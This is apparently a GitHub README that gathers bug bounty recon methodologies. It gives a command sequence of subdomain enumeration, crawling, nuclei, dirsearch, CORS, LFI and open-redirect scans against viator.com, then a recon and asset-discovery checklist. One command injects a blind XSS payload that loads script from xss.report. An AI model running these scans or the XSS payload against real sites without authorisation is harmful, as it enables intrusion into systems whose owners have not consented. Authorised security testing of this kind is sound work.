# Bug-Hunting-methodologies
this repo contains some public methodologies which I found from internet (google,telegram,discord,writeups etc..) 

# Help to Improv repo
If you found any methodologies please add a pull request so I can merge that and update the repo :D

# methodology number 1
```
subfinder -d viator.com -all  -recursive > subdomain.txt

cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

cat allurls.txt | grep -E "\.js$" >> js.txt

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ 

echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors

nuclei  -list ~/vaitor/subdomains_alive.txt -tags cves,osint,tech

cat allurls.txt | gf lfi | nuclei -tags lfi
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
```

---

# methodology number 2 

- methodology source : [https://github.com/RemmyNine/BBH-Recon](https://github.com/RemmyNine/BBH-Recon)

- [Wide Recon](#WideRecon)
    - [Subdomain Enumerating](#Subdomain_Enumerating)
        - [Subfinder](https://github.com/projectdiscovery/subfinder) - GOAT, Config before you use it. Run it using `subfinder -dL target.txt -all -recursive -o output`
        - [BBot](https://github.com/blacklanternsecurity/bbot) - An alternative to subfinder.
        - [DNSDumpster](https://dnsdumpster.com/)
        - [crtSh Postgress DB](https://github.com/RemmyNine/Methodology/blob/main/crtsh.sh) -- Connect to pqdb and extract subdomains. Also manually use this website for some validations.
        - [AbuseIPDB](https://github.com/atxiii/small-tools-for-hunters/tree/main/abuse-ip) -- Use Atxii Script.
        - Favicon Hash -- Search the hash in Shodan --> Write a script to calculate the mm3 hash and search it in shodan.io
        - [Gau](https://github.com/lc/gau) --  `gau --subs example.com | unfurl -u domain | tee >> subs.txt`
        - [Waybackurls](https://github.com/tomnomnom/waybackurls) -- `echo domain.com | waybackurls | unfurl -u domains |‌ tee >> wbuRes.txt`
        - Host Header fuzzing on IP + URL.tld -> `fuf -w wordlist.txt -u "https://domaint.tld" -H "host: FUZZ" -H '### Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0`
        - PTR Record from IP
        - Scan ports 80, 443, and 8080 on the target IP address to discover new URLs.
        - Reverse DNS lookup
        - [Adtracker](https://github.com/dhn/udon) -- Use Udon, [BuiltWith](https://builtwith.com/) to use same Ad ID to search for similar domains/subdomains.
      - [DNS BureForce](#DnsBF)
          - [PureDNS](https://github.com/d3mondev/puredns) --> Do a static DNS bruteforce with multiple worldlist. Assetnote, all.txt by JHaddix and SecLists are good options.
          - [Gotator](https://github.com/Josue87/gotator) and [DNSGen](https://github.com/AlephNullSK/dnsgen) --> This gonna be a second-time/dynamic DNS bruteforce using permutation. *DO NOT SKIP THIS PART*
       
- [Asset Discovery](#AssetDiscovery)
    - Find ASNs + CIDRs + IP, NameServers --> PortScan + Reverse DNS Lookup
    - Unqiue Strings, Copyrights.
    - Find new assets on news, Stock market, Partners, about us.
    - Find new assets on crunchbase and similar websites.
    - Emails --> Reverse email lookup
    - MailServers + Certificate --> Reverse MX + SSL Search (For SSL use crtsh)
    - Search on different search engines (Google, Bing, Yandex)
    - Google Dorks (acquired by company, company. All Rights Reserved., © 2021 company. All Rights Reserved., company. All Rights Reserved." -inurl:company, acquired by target. target subsidiaries)
    - Search SSL on Shodan, FOFA and Censys.
    - Find same DMARC Information [DMARC Live](https://dmarc.live/info/yahoo.com)
